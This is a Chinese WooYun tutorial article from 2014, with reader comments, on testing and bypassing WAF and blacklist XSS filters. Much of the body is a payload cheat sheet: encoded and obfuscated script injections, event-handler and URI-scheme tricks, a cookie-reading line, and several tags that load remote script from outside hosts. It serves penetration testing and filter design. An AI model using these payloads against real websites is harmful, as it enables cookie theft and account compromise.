@@ -1,0 +1,139 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Bypass xss过滤的测试方法</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">五道口杀气</a> <span class="bull">·</span> <time title="2014/01/02 19:16" ui-time="" datetime="2014/01/02 19:16" class="published ng-binding ng-isolate-scope">2014/01/02 19:16</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 背景</h2><hr><p>本文来自于《Modern Web Application Firewalls Fingerprinting and Bypassing XSS Filters》其中的bypass xss过滤的部分，前面有根据WAF特征确定是哪个WAF的测试方法给略过了，重点来看一下后面绕xss的一些基本的测试流程，虽说是绕WAF的，但这里还是根据WAF中的正则缺陷来绕过测试方法，并不是协议上问题，所以呢，基本可以通用于其他xss过滤的场景。方便新手们比较快速的了解到测试xss的一些基本的方法。</p><h2>0x01 Bypassing黑名单</h2><hr><p>大多数的场所是用的黑名单来做过滤器的，有三种方式绕过黑名单的测试：</p><pre><code>1、暴力测试（输入大量的payload，看返回结果）
+2、根据正则推算
+3、利用浏览器bug
+</code></pre><h3>初步测试</h3><p>1)尝试插入比较正常的HTML标签，例如：<code>&lt;b&gt;，&lt;i&gt;，&lt;u&gt;</code>来看一下返回页面的情况是怎样的，是否被HTML编码了，或者标签被过滤了。</p><p>2)尝试插入不闭合的标签，例如：<code>&lt;b，&lt;i，&lt;u，&lt;marquee</code>然后看一下返回响应，是否对开放的标签也有过滤。</p><p>3)然后测试几个XSS的payload，基本所有的xss过滤器都会进行过滤的：</p><pre><code>&lt;script&gt;alert(1);&lt;/script&gt;
+&lt;script&gt;prompt(1);&lt;/script&gt;
+&lt;script&gt;confirm(1);&lt;/script&gt;
+&lt;scriptsrc="http://rhainfosec.com/evil.js"&gt;
+</code></pre><p>看返回响应，是过滤的全部，还是只过滤了部分，是否还留下了<code>alert,prompt,confirm</code>字符，再尝试大小写的组合：</p><pre><code>&lt;scRiPt&gt;alert(1);&lt;/scrIPt&gt;
+</code></pre><p>4)如果过滤器仅仅是把<code>&lt;script&gt;</code>和<code>&lt;/script&gt;</code>标签过滤掉，那么可以用</p><pre><code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;
+</code></pre><p>的方式来绕过，这样当<code>&lt;script&gt;</code>标签被过滤掉，剩下的组合起来刚好形成一个完整的payload。</p><p>5)用<code>&lt;a href</code>标签来测试，看返回响应</p><pre><code>&lt;a href="http://www.google.com"&gt;Clickme&lt;/a&gt;
+</code></pre><blockquote><p><code>&lt;a</code>标签是否被过滤 href是否被过滤 href里的数据是否被过滤</p></blockquote><p>如果没有数据被过滤，插入javascript协议看看：</p><pre><code>&lt;a href="javascript:alert(1)"&gt;Clickme&lt;/a&gt;
+</code></pre><blockquote><p>是否返回错误 javascript的整个协议内容是否都被过滤掉，还是只过滤了javascript字符 尝试下大小写转换</p></blockquote><p>继续测试事件触发执行javascript：</p><pre><code>&lt;a href="rhainfosec.com" onmouseover=alert(1)&gt;ClickHere&lt;/a&gt;
+</code></pre><p>看onmouseover事件是否被过滤。测试一个无效的事件，看过滤规则：</p><pre><code>&lt;a href="rhainfosec.com" onclimbatree=alert(1)&gt;ClickHere&lt;/a&gt;
+</code></pre><p>是完整的返回了呢，还是跟onmouseover一样被干掉了。</p><p>如果是完整的返回的话呢，那么意味着，做了事件的黑名单，但是在HTML5中，有超过150种的方式来执行javascript代码的事件测试一个很少见的事件：</p><pre><code>&lt;body/onhashchange=alert(1)&gt;&lt;a href=#&gt;clickit
+</code></pre><h3>测试其他标签</h3><p>接下来测试其他的标签跟属性</p><h4>Src属性</h4><pre><code>&lt;img src=x onerror=prompt(1);&gt;
+&lt;img/src=aaa.jpg onerror=prompt(1);&gt; 
+&lt;video src=x onerror=prompt(1);&gt;
+&lt;audio src=x onerror=prompt(1);&gt;
+</code></pre><h4>iframe标签</h4><pre><code>&lt;iframe src="javascript:alert(2)"&gt;
+&lt;iframe/src="data:text&amp;sol;html;&amp;Tab;base64&amp;NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="&gt;
+</code></pre><h4>embed标签</h4><pre><code>&lt;embed/src=//goo.gl/nlX0P&gt;
+</code></pre><h4>action属性</h4><p>利用<code>&lt;form，&lt;isindex</code>等标签中的action属性执行javascript</p><pre><code>&lt;form action="Javascript:alert(1)"&gt;&lt;input type=submit&gt;
+&lt;isindex action="javascript:alert(1)" type=image&gt;
+&lt;isindex action=j&amp;Tab;a&amp;Tab;vas&amp;Tab;c&amp;Tab;r&amp;Tab;ipt:alert(1) type=image&gt;
+&lt;isindex action=data:text/html, type=image&gt;
+&lt;formaction='data:text&amp;sol;html,&amp;lt;script&amp;gt;alert(1)&amp;lt/script&amp;gt'&gt;&lt;button&gt;CLICK
+</code></pre><h4>formaction属性</h4><pre><code>&lt;isindexformaction="javascript:alert(1)" type=image&gt;
+&lt;input type="image" formaction=JaVaScript:alert(0)&gt;
+&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME
+</code></pre><h4>background属性</h4><pre><code>&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; // 在Opera 10.5和IE6上有效
+</code></pre><h4>poster属性</h4><pre><code>&lt;video poster=javascript:alert(1)//&gt;&lt;/video&gt; // Opera 10.5以下有效
+</code></pre><h4>data属性</h4><pre><code>&lt;object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="&gt;
+&lt;object/data=//goo.gl/nlX0P?
+</code></pre><h4>code属性</h4><pre><code>&lt;applet code="javascript:confirm(document.cookie);"&gt; // Firefox有效
+&lt;embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always&gt;
+</code></pre><h4>事件触发</h4><pre><code>&lt;svg/onload=prompt(1);&gt;
+&lt;marquee/onstart=confirm(2)&gt;/
+&lt;body onload=prompt(1);&gt;
+&lt;select autofocus onfocus=alert(1)&gt;
+&lt;textarea autofocus onfocus=alert(1)&gt;
+&lt;keygen autofocus onfocus=alert(1)&gt;
+&lt;video&gt;&lt;source onerror="javascript:alert(1)"&gt;
+</code></pre><h4>最短的测试向量</h4><pre><code>&lt;q/oncut=open()&gt;
+&lt;q/oncut=alert(1)&gt;//在限制长度的地方很有效
+</code></pre><h4>嵌套</h4><pre><code>&lt;marquee&lt;marquee/onstart=confirm(2)&gt;/onstart=confirm(1)&gt;
+&lt;bodylanguage=vbsonload=alert-1//IE8有效
+&lt;command onmouseover
+="\x6A\x61\x76\x61\x53\x43\x52\x49\x50\x54\x26\x63\x6F\x6C\x6F\x6E\x3B\x63\x6F\x6E\x6 6\x69\x72\x6D\x26\x6C\x70\x61\x72\x3B\x31\x26\x72\x70\x61\x72\x3B"&gt;Save&lt;/command&gt; //IE8有效
+</code></pre><h4>过滤括号的情况下</h4><p>当括号被过滤的时候可以使用throw来绕过</p><pre><code>&lt;a onmouseover="javascript:window.onerror=alert;throw 1&gt;
+&lt;img src=x onerror="javascript:window.onerror=alert;throw 1"&gt;
+</code></pre><p>以上两个测试向量在Chrome跟IE在上面会出现一个“uncaught”的错误，可以用以下的向量：</p><pre><code>&lt;body/onload=javascript:window.onerror=eval;throw'=alert\x281\x29';&gt;
+</code></pre><h4>expression属性</h4><pre><code>&lt;img style="xss:expression(alert(0))"&gt; // IE7以下
+&lt;div style="color:rgb(''&amp;#0;x:expression(alert(1))"&gt;&lt;/div&gt; // IE7以下
+&lt;style&gt;#test{x:expression(alert(/XSS/))}&lt;/style&gt; // IE7以下
+</code></pre><h4>location属性</h4><pre><code>&lt;a onmouseover=location='javascript:alert(1)'&gt;click
+&lt;body onfocus="loaction='javascript:alert(1)'"&gt;123
+</code></pre><h4>其他的一些payload</h4><pre><code>&lt;meta http-equiv="refresh" content="0;url=//goo.gl/nlX0P"&gt;
+&lt;meta http-equiv="refresh" content="0;javascript&amp;colon;alert(1)"/&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;&lt;g onload="javascript:\u0061lert(1);"&gt;&lt;/g&gt;&lt;/svg&gt;
+&lt;svg xmlns:xlink="http://www.w3.org/1999/xlink"&gt;&lt;a&gt;&lt;circle r=100 /&gt;&lt;animate attributeName="xlink:href" values=";javascript:alert(1)" begin="0s" dur="0.1s" fill="freeze"/&gt;
+&lt;svg&gt;&lt;![CDATA[&gt;&lt;imagexlink:href="]]&gt;&lt;img/src=xx:xonerror=alert(2)//"&gt;&lt;/svg&gt;
+&lt;meta content="&amp;NewLine; 1 &amp;NewLine;;JAVASCRIPT&amp;colon; alert(1)" http-equiv="refresh"/&gt;
+&lt;math&gt;&lt;a xlink:href="//jsfiddle.net/t846h/"&gt;click
+</code></pre><h4>当= ( ) ; :被过滤时</h4><pre><code>&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt; // 通杀所有浏览器
+</code></pre><p>opera中可以不闭合</p><pre><code>&lt;svg&gt;&lt;script&gt;alert&amp;#40 1&amp;#41 // Opera可查
+</code></pre><h3>实体编码</h3><p>很多情况下WAF会实体编码用户的输入数据，</p><p>javascript是一个很灵活的语言，可以使用很多编码，比如十六进制，Unicode和HTML。但是也对这些编码可以用在哪个位置有规定：</p><p>属性：</p><pre><code>href=
+action=
+formaction=
+location=
+on*=
+name=
+background=
+poster=
+src=
+code=
+</code></pre><p>支持的编码方式：HTML，八进制，十进制，十六进制和Unicode</p><p>属性：</p><pre><code>data=
+</code></pre><p>支持的编码：base64</p><h3>基于上下文的过滤</h3><p>WAF最大的问题，在于不知道输出的位置的上下文，导致根据具体环境可以绕过。</p><h4>输入在属性里</h4><pre><code>&lt;input value="XSStest" type=text&gt;
+</code></pre><p>可控位置为XSStest，可以使用</p><pre><code>"&gt;&lt;img src=x onerror=prompt(0);&gt;
+</code></pre><p>如果<code>&lt; &gt;</code>被过滤的话可以换成</p><pre><code>" autofocus onfocus=alert(1)//
+</code></pre><p>同样还有很多其他的payload：</p><pre><code>"onmouseover=" prompt(0)x="
+"onfocusin=alert(1) autofocusx="
+" onfocusout=alert(1) autofocus x="
+"onblur=alert(1) autofocusa="
+</code></pre><h4>输入在script标签中</h4><p>例如：</p><pre><code>&lt;script&gt;
+Var x="Input";
+&lt;/script&gt;
+</code></pre><p>可控位置在Input，可以闭合script标签插入代码，但是同样我们仅仅闭合双引号就可以执行js代码了</p><pre><code>";alert(1)//
+</code></pre><p>最终结果就是</p><pre><code>&lt;script&gt;
+Var x="";alert(1)//
+&lt;/script&gt;
+</code></pre><h4>非常规的事件监听</h4><p>例如：</p><pre><code>";document.body.addEventListener("DOMActivate",alert(1))//
+";document.body.addEventListener("DOMActivate",prompt(1))//
+";document.body.addEventListener("DOMActivate",confirm(1))//
+</code></pre><p>下面是一些相同的类：</p><pre><code>DOMAttrModified
+DOMCharacterDataModified
+DOMFocusIn
+DOMFocusOut
+DOMMouseScroll
+DOMNodeInserted
+DOMNodeInsertedIntoDocument
+DOMNodeRemoved
+DOMNodeRemovedFromDocument
+DOMSubtreeModified
+</code></pre><h4>HREF内容可控</h4><p>例如：</p><pre><code>&lt;a href="Userinput"&gt;Click&lt;/a&gt;
+</code></pre><p>可控的是Userinput那里我们需要做的只是把javascript代码输入就好了：</p><pre><code>javascript:alert(1)//
+</code></pre><p>最后组合为：</p><pre><code>&lt;a href="javascript:alert(1)//"&gt;Click&lt;/a&gt;
+</code></pre><h4>变换</h4><p>使用HTML实体URL编码绕过黑名单，href里会自动实体解码，如果都失败了，可以尝试使用vbscript在IE10以下都有效，或者使用data协议。</p><h4>JavaScript变换</h4><p>使用javascript协议时可使用的例子：</p><pre><code>javascript&amp;#00058;alert(1)
+javaSCRIPT&amp;colon;alert(1)
+JaVaScRipT:alert(1)
+javas&amp;Tab;cript:\u0061lert(1);
+javascript:\u0061lert&amp;#x28;1&amp;#x29
+javascript&amp;#x3A;alert&amp;lpar;document&amp;period;cookie&amp;rpar;
+</code></pre><h4>Vbscript变换</h4><pre><code>vbscript:alert(1);
+vbscript&amp;#00058;alert(1);
+vbscr&amp;Tab;ipt:alert(1)"
+Data URl
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+</code></pre><h4>JSON</h4><p>当你的输入会在encodeURIComponent当中显示出来的时候，很容易插入xss代码了</p><pre><code>encodeURIComponent('userinput')
+</code></pre><p>userinput处可控，测试代码：</p><pre><code>-alert(1)-
+-prompt(1)-
+-confirm(1)-
+</code></pre><p>最终结果：</p><pre><code>encodeURIComponent("-alert(1)-")
+encodeURIComponent("-prompt(1)-")
+</code></pre><h4>SVG标签</h4><p>当返回结果在svg标签中的时候，会有一个特性</p><pre><code>&lt;svg&gt;&lt;script&gt;varmyvar="YourInput";&lt;/script&gt;&lt;/svg&gt;
+</code></pre><p>YourInput可控，输入</p><pre><code>www.site.com/test.php?var=text";alert(1)//
+</code></pre><p>如果把"编码一些他仍然能够执行:</p><pre><code>&lt;svg&gt;&lt;script&gt;varmyvar="text&amp;quot;;alert(1)//";&lt;/script&gt;&lt;/svg&gt;
+</code></pre><h3>浏览器bug</h3><p>字符集的bug在IE中出现过很多次，第一个就是UTF-7，但是这个只在之前的版本中可用，现在讨论一个在现在的浏览器当中可以执行的javascript。</p><pre><code>http://xsst.sinaapp.com/utf-32-1.php?charset=utf-8&amp;v=XSS
+</code></pre><p>这个页面当中我们可控当前页面的字符集，当我们常规的测试时：</p><pre><code>http://xsst.sinaapp.com/utf-32-1.php?charset=utf-8&amp;v="&gt;&lt;img src=x onerror=prompt(0);&gt;
+</code></pre><p>返回结果可以看到双引号被编码了：</p><pre><code>&lt;html&gt;
+&lt;meta charset="utf-8"&gt;&lt;/meta&gt;
+&lt;body&gt;
+&lt;input type="text" value="&amp;quot;&amp;gt;&amp;lt;img src=x onerror=prompt(0);&amp;gt;"&gt;&lt;/input&gt;
+&lt;/body&gt;
+&lt;/html&gt; 
+</code></pre><p>设置字符集为UTF-32：</p><pre><code>http://xsst.sinaapp.com/utf-32-1.php?charset=utf-32&amp;v=%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80
+</code></pre><p>上面这个在IE9及以下版本可以执行成功。</p><p>利用0字节绕过：</p><pre><code>&lt;scri%00pt&gt;alert(1);&lt;/scri%00pt&gt;
+&lt;scri\x00pt&gt;alert(1);&lt;/scri%00pt&gt;
+&lt;s%00c%00r%00%00ip%00t&gt;confirm(0);&lt;/s%00c%00r%00%00ip%00t&gt;
+</code></pre><p>在IE9及以下版本有效。</p><p>其他等等一系列浏览器特性的XSS可以参考以下文章：</p><p><a href="http://drops.wooyun.org/tips/147">http://drops.wooyun.org/tips/147</a></p><h2>0x02 总结</h2><hr><p>本文主要是一个测试XSS的思路流程，并没有把所有的payload写全，其实也没有人能够写全，只是列了一个大体的框架，大家实际在寻找的过程中可以不断慢慢的根据这种思路补充自己的payload，想必呢，一定会有很大的进步的！~</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/159" rel="bookmark" id="re1">Bypass IE XSS Filter</a></li><li><a href="http://drops.wooyun.org/papers/512" rel="bookmark" id="re2">Short XSS</a></li><li><a href="http://drops.wooyun.org/tips/3059" rel="bookmark" id="re3">xss挑战赛writeup</a></li><li><a href="http://drops.wooyun.org/web/11539" rel="bookmark" id="re4">XSS Attacks - Exploiting XSS Filter</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">乌云首席鉴黄师</span> <span class="reply-time">2016-06-16 01:59:42</span></div><p></p><p>请问一下&quot; 双引号被过滤 无法闭合语句 这该怎么办</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">无聊</span> <span class="reply-time">2016-04-21 09:40:18</span></div><p></p><p>根本没什么意义 尖括号搞不定 这都是浮云</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2016-01-02 19:59:15</span></div><p></p><p>@昌维 编码</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">YxWa</span> <span class="reply-time">2015-07-15 19:09:23</span></div><p></p><p>@昌维 我也想知道</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Gnest</span> <span class="reply-time">2015-04-20 19:39:53</span></div><p></p><p>涨姿势了！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">昌维</span> <span class="reply-time">2015-04-19 16:48:36</span></div><p></p><p>我想知道尖括号全部过滤该怎么办，比如说&lt;test&gt;这样也会被过滤，该怎么办</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">一天到晚吃</span> <span class="reply-time">2015-01-05 19:39:08</span></div><p></p><p>&lt;scri%00pt&gt;alert(1);&lt;/scri%00pt&gt;<br>&lt;scri\x00pt&gt;alert(1);&lt;/scri%00pt&gt;<br>&lt;s%00c%00r%00%00ip%00t&gt;confirm(0);&lt;/s%00c%00r%00%00ip%00t&gt;<br>这几个我在IE8下，还是被检测出来了.</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">暗影</span> <span class="reply-time">2014-07-16 20:33:12</span></div><p></p><p>被过滤了 怎么办</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小威</span> <span class="reply-time">2014-06-25 11:35:09</span></div><p></p><p>涨姿势了！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瘦前纳什胖后德隆</span> <span class="reply-time">2014-04-03 22:23:09</span></div><p></p><p>mark</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小贱人</span> <span class="reply-time">2014-03-13 01:07:37</span></div><p></p><p>很好的总结呀</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ivan</span> <span class="reply-time">2014-02-21 16:55:08</span></div><p></p><p>mark一下</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Mr.Anderson</span> <span class="reply-time">2014-01-03 17:02:11</span></div><p></p><p>很好的总结。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">zzR</span> <span class="reply-time">2014-01-03 15:53:16</span></div><p></p><p>鸟个尿</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">icErainow</span> <span class="reply-time">2014-01-03 10:15:27</span></div><p></p><p>躺个床</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">黄小昏</span> <span class="reply-time">2014-01-03 00:02:29</span></div><p></p><p>板个凳</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">insight-labs</span> <span class="reply-time">2014-01-02 21:44:01</span></div><p></p><p>杀个发</p><p></p></div></div></div></div></div></main>
